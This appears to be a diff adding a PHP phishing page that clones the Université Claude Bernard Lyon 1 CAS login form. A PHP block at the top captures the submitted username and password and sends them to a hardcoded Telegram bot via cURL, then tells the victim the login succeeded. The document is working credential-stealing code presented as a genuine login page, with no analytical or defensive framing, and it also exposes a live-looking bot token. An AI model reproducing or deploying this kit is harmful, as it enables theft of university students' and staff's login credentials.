@@ -1,0 +1,166 @@
+<?php
+if(isset($_POST['submit'])){
+    $botToken = '6967399716:AAGW2K0iMI281sq2A804cAXKQouMBTV2Qbg'; // Remplacez par votre token de bot Telegram
+    $chatId = '5054599179'; // Remplacez par l'ID du chat Telegram
+
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    // Créez le message à envoyer
+    $message = "Nouvelle connexion sur le site : \n";
+    $message .= "Username : " . $username . "\n";
+    $message .= "Mot de passe : " . $password;
+
+    // Construisez l'URL pour envoyer le message
+    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
+
+    // Utilisez cURL pour envoyer le message
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $result = curl_exec($ch);
+    curl_close($ch);
+
+    // Vérifiez la réponse de Telegram
+    $result = json_decode($result, true);
+    if(isset($result['ok']) && $result['ok']) {
+        echo "Connexion réussie !";
+    } else {
+        echo "Une erreur s'est produite lors de l'envoi du message.";
+    }
+}
+?>
+<!DOCTYPE html>
+<!-- saved from url=(0035)https://cas.univ-lyon1.fr/cas/login -->
+<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Service Central d'Authentification (CAS) – Université Lyon 1</title>
+        
+        
+        <meta name="description" content="Serveur central d&#39;authentification de l&#39;Universite Claude Bernard Lyon 1">
+        <meta name="keywords" content="CAS, serveur, authentification, central, université, Lyon1">
+        <meta name="robots" content="index, follow">
+        <meta name="author" lang="fr" content="DSI - UCBL">
+    		
+        <!--RESET-->
+        <link href="./uvs_files/normalize.css" rel="stylesheet" media="screen">
+        <!--CSS JASIG LYON 1-->
+        <link type="text/css" rel="stylesheet" href="./uvs_files/cas.css">
+        
+        <script type="text/javascript" src="./uvs_files/jquery-ui.min.js"></script>
+        <script type="text/javascript" src="./uvs_files/cas.js"></script>
+        <link rel="icon" href="https://cas.univ-lyon1.fr/cas/favicon.ico" type="image/x-icon">
+	<meta id="ConnectiveDocSignExtentionInstalled" name="ConnectiveDocSignExtentionInstalled" data-extension-version="1.0.6"></head>
+	<body id="cas" class="fl-theme-iphone" style="">
+    <header>
+      <div id="header" class="flc-screenNavigator-navbar fl-navbar fl-table">
+        <h1 id="company-name">Université Claude Bernard Lyon 1</h1>
+      </div>  
+    </header>
+    <div class="flc-screenNavigator-view-container">
+        <div class="fl-screenNavigator-view">
+            <section>
+              <div id="content" class="fl-screenNavigator-scroll-container">
+                  <h1 id="app-name" class="fl-table-cell">Service Central d'Authentification<span id="Lyon1"> Lyon 1</span><span id="AbbrCas"> - <abbr title="CAS est un système d&#39;authentification unique qui permet de vous connecter sur les applications de l&#39;Université Lyon 1.&lt;br /&gt;&lt;br /&gt;Pour des raisons de sécurité, veuillez vous déconnecter et fermer votre navigateur lorsque vous avez fini d&#39;accéder aux services authentifiés." rel="tooltip">CAS</abbr></span></h1>
+
+      
+        <div class="box fl-panel" id="login">
+          <form id="fm1" class="fm-v clearfix" action="https://cas.univ-lyon1.fr/cas/login" method="post">
+            
+              <h2>Entrez votre identifiant et votre mot de passe.</h2>
+              <div class="row fl-controls-left">
+                <label for="username" class="fl-label"><span class="accesskey">I</span>dentifiant:</label>
+      					
+      					
+      					
+                 
+                 <div class="help">
+                     <abbr title="&lt;strong&gt;Si vous êtes étudiant&lt;/strong&gt; :&lt;br /&gt;votre identifiant est votre numéro étudiant dont le premier chiffre est remplacé par P (si le 1er chiffre est 1) ou X (si le 1er chiffre est 9)  ou W (si le 1er chiffre est 8).&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;Si vous êtes personnel&lt;/strong&gt; :&lt;br /&gt; votre identifiant est  de la forme &#39;prenom.nom&#39; sans accent." rel="tooltip">?</abbr>
+                 </div>
+      					<input id="username" name="username" class="required" tabindex="1" placeholder="Ex: p1234567 ou prenom.nom" accesskey="i" type="text" value="" size="25" autocomplete="off">
+      					
+              </div>
+              <div class="row fl-controls-left">
+                <label for="password" class="fl-label"><span class="accesskey">M</span>ot de passe:</label>
+      						
+      				  
+                
+                <div class="help">
+                  <abbr title="Votre mot de passe est celui que vous devez avoir défini dans l&#39;application SESAME (&lt;strong&gt;https://sesame.univ-lyon1.fr&lt;/strong&gt;) &lt;br /&gt;&lt;br /&gt;&lt;u&gt;&lt;strong&gt;Conseil&lt;/strong&gt;&lt;/u&gt; : Pour être sûr, votre mot de passe doit comporter au moins 8 caractères, au moins une lettre majuscule, une lettre minuscule et un chiffre" rel="tooltip">?</abbr>
+                </div>
+      					<input id="password" name="password" class="required" tabindex="2" placeholder="Votre mot de passe" accesskey="m" type="password" value="" size="25" autocomplete="off">
+              </div>
+              <div class="row check">
+                <ul>
+                  <li>
+                    <input id="warn" name="warn" value="true" tabindex="3" accesskey="p" type="checkbox">
+                    <label for="warn"><span class="accesskey">P</span>révenez-moi avant d'accéder à d'autres services.<abbr title="Lorsque vous vous authentifiez, la case &quot;Prévenez-moi avant de me connecter à d&#39;autres services&quot; n&#39;est pas cochée par défaut.&lt;br /&gt;Ainsi, l&#39;accès aux autres services informatiques de l&#39;Université se fait automatiquement, sans demande de confirmation.&lt;br /&gt;&lt;br /&gt;Si vous cochez cette case, un avis vous préviendra quand vous serez sur le point d&#39;accéder à un autre service informatique de l&#39;Université. Vous devrez alors approuver la demande d&#39;accès en cliquant sur Continuer." rel="tooltip">?</abbr></label>
+                  </li>
+                  <li>
+                    <input id="publicWorkstation" name="publicWorkstation" value="false" tabindex="4" type="checkbox">
+                    <label for="publicWorkstation">Je suis sur un ordinateur public.</label>
+                  </li>
+                  <li>
+                    <input type="checkbox" name="rememberMe" id="rememberMe" value="true" tabindex="4" accesskey="r">
+                    <label for="rememberMe"><span class="accesskey">R</span>ester connecté <abbr title="En cochant cette case vous resterez connecté pendant 7 jours, même si vous fermez votre navigateur. &lt;br /&gt;&lt;br /&gt;Si vous voulez forcer la déconnexion, cliquez sur le lien &quot;Déconnexion&quot; en bas de page &lt;br /&gt;&lt;br /&gt;&lt;u&gt;&lt;strong&gt;Conseil&lt;/strong&gt;&lt;/u&gt; : Utiliser cette option uniquement sur un ordinateur privé." rel="tooltip">?</abbr></label>
+                  </li>
+                </ul>
+              </div>
+              <div class="row btn-row">
+                <input type="hidden" name="lt" value="">
+                <input type="hidden" name="execution" value="5b28f2a4-e776-4c6e-9d49-dd627584a434_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuZFN0cEwxWjNOazVLVlRrM05ITllUWEZLY0d4WlRrdDNkalV4TmxKb1VGaFBhVkp1TjNKSVdYTmlkRWR4TjNkTFVGbDZjMVZ0VTFSQ0wxQndVemhMZVdvMmFEbEVlbUkxUWxFNFZYbGpUamhhYlVoNGRGSjNjRkJCYUdOcVFVOVdVWEJKYVhKck1HUkJjVkV3TVUxRkszRlpjRFZEYVRKb2RIWXZPRWxGTmxoT1YwNXNXazlyYzNkaFppdERWMG96ZUcxUVVuZFFZMDRyVGt0bWRXUnVlR3B3YTJkTk9YWlRPRXhqYWtabWFrTk5WbWwyV21zdlJtMUdZMnd2T1hBM1ZtbGhOV0oyYlRWQll6WjRVQzgxVEdabVowOW9RMU53V2pjM2NUbEhlblYyTUc0MFQwZHZXRWwzUzBSQ2NqZHVVRmxtVkhsTlN5c3JlR2xZYnpGeFQxbHBibEIyUkVKeVJsWndOMUY1YmtGMWMyaEJZbE4wYm1VclluTlFjVzV0U0RsMU5XdG5SREpOY2pGUWJXMUVkQzlvUTFSdmNITlhUVFZhUVd4Q04xSlFkbEYyVVRKbmRVVjNZVXhxTURaSlREaFpiamwwTkRGdFUyTjBaM1ZOYnk4dlRtVlhkMUI1TDNsTlJFWnhUR1JtWm5OVFRUWnFNbTh3U0U5T1VtUnZkM2RVVkRWWmNGaDNNRWhxVkc5SldEUjBkVzV2VFRBeWN6VXdNMjlrUjBONk9UWnZXRGN4WVVscWJFdHhVVWw2VVZKM01rMXBUbk5ZTHpOU01XMURPSGhsZVd4cGJHc3ZjRWRrWkhsYWMwZHJSbTFJVTJWblNURnNlV2t5UVhWWVkxUnhaVmRNUjJ4clJuaFpSSEpuYmxST01XWTJPRzlEYWtNMGNVaFZiVFZRVXpkQ2RGSlhaMk13YURodWFVSndUVmxGU0hOUk1rOXNZVmx2U0doSldUaFZSVWMyWjNCTVluTkVXRUp2TDNoTlpsRnZlbEprTkdSa1UyVTVWRmhEUTBVNE5rdEpWM0ExZEZWUUsxazBRbEV4T0RJeVRFVmhkbkJQTVVaeFlsWjFUelJHTVZWcE1FWTJRWEZFV25VclIxTkZRamdyVFNzclZFWlViRkI2VjFSR01ucENhVzV1YWxOTGNIa3hibWwxU2xZM2N6QkhURVJaT1hwbmFIUkRhVWRLSzNRd1VHY3JaVk5VUzI4ek9YUTJUbE42T0c1cVNFTlRLekJWSzBnd2NVcE1kbFpIV1ZCNVFuVkxlRTFwYlU5a05EZHBRbGhETUZBMlQzcFhWVnAzU2tkSU1UUlliQ3RTZWpkcU9IVmFSM0ExVUZZeU5uTTJNa2RyU1dKWlZUUm1UQ3RIZVRkb1NWQkJVazR4YVZaSU9EVnZTSGc0VFhkTGNIaGlPRzVRUlV4UlVVZHpNMDVJU1hWd1VscG9ORWhQWm1GVU1HZFdUVVJWZUVWeVYydG1URkJzUWtKaVdrVlhTVTkwY25sYWVqUnlaVFJ0UlVkNGQwcGxaR0o1WW5NemVXTm1hMlp0ZURBdk9XdHdTR2RRUTJsaGVHMXVSbUpyWkdzM1QyRmtkblU1ZUhVeWFsbFlPRWd2ZVdGMVZuTkRPVUozUVU1Rk1GZDZkRFl3V1dWT2NrcHhNM0p0UkdGd1pUUTFja0pIWVc5MWQyUXdaWFZ2VWxCRVRrRnpWWHBvYUVZNVZtaGtUbGR0YTBGTVUzTnRVMUpCWnowOS4yYmRja0l4OVBlZkdPd0xUa1F2ZWhvbG1WbmQtNmtyRUxKMU5aQ0t4UDIxTFdJMlFqanctVXo3RGhCckxDYlpmWTA0M292T0dQc0ZldmItT0R0bWhVUQ==">
+                <input type="hidden" name="_eventId" value="submit">
+                <input class="btn-submit" name="submit" accesskey="l" value="SE CONNECTER" tabindex="5" type="submit" title="SE CONNECTER">
+              </div>
+            </form>
+          </div>
+          <nav>            
+            <div id="list-languages" class="fl-panel">
+              
+              
+              
+              
+                
+              
+              
+                  <ul>
+                    <li><a href="https://cas.univ-lyon1.fr/cas/login?locale=fr" title="Français">Français</a></li> 
+                    <li><a href="https://cas.univ-lyon1.fr/cas/login?locale=en" title="English">English</a></li>
+                    <li><a href="https://cas.univ-lyon1.fr/cas/login?locale=es" title="Español">Español</a></li>
+                  </ul>
+                
+              
+           </div>
+         </nav>
+         <aside>
+            <div id="InfoHelp">
+              <h3 id="show_hide" title="Cliquez pour afficher ou masquer l&#39;aide"><span class="accesskey">A</span>ide</h3>
+              <div id="ContentHelp">
+                <ul>
+                  <li>Pour vous authentifier, vous devez impérativement avoir <u><strong>activé votre compte informatique</strong></u>. Si ce n'est pas le cas (ou si vous voulez  <u>changer</u> votre mot de passe): utilisez le service <a href="https://sesame.univ-lyon1.fr/" title="Accès au portail SESAME Lyon 1"><strong>SESAME</strong></a></li>
+                  <li>Si vous avez déjà activé votre compte informatique et qu’il vous est impossible de vous identifier, contactez l'assistance au <a href="tel:0426237155" title="Téléphoner au support"><strong>04.26.23.71.55</strong></a> ou au 371.55 depuis un poste interne.</li>
+                  <li>Si votre compte est actif et fonctionnel, vous pouvez signaler un incident informatique sur <a href="http://sosinfo.univ-lyon1.fr/" title="Accès au portail SOS Informatique Lyon 1"><strong>SOS Informatique</strong></a></li>
+                  <li>Consulter la <a href="https://www.univ-lyon1.fr/-615685.kjsp" title="Accès a la charte informatique Lyon 1"><strong>Charte informatique de l’Université Lyon 1</strong></a></li>
+                </ul>
+              </div>
+            </div>
+          </aside>
+
+
+        </div>
+      </section>
+      <footer>
+        <div id="footer" class="fl-panel fl-note fl-bevel-white fl-font-size-80">
+          <div id="copyright">
+            <nav>
+              <ul>
+                <li><a href="https://cas.univ-lyon1.fr/" title="Accès à la page d&#39;accueil du Service Central d&#39;Authentification">Accueil</a></li>
+                <li><a href="https://www.univ-lyon1.fr/" title="Accès au site web de l&#39;Université Claude Bernard Lyon 1">Université Lyon 1</a> - <a href="https://www.univ-lyon1.fr/a-propos-du-site/mentions-legales/" title="Consulter les mentions légales">Tous droits réservés</a></li>
+                <li><a href="https://cas.univ-lyon1.fr/cas/logout" title="Se déconnecter du service central d&#39;authentification">Déconnexion</a></li>
+              </ul>
+            </nav>
+          </div>
+        </div>
+      </footer>
+    </div>
+  </div>
+  <div id="loom-companion-mv3" ext-id="liecbddmkiiihnedobmlmillhodjkdmb"></div></body></html>
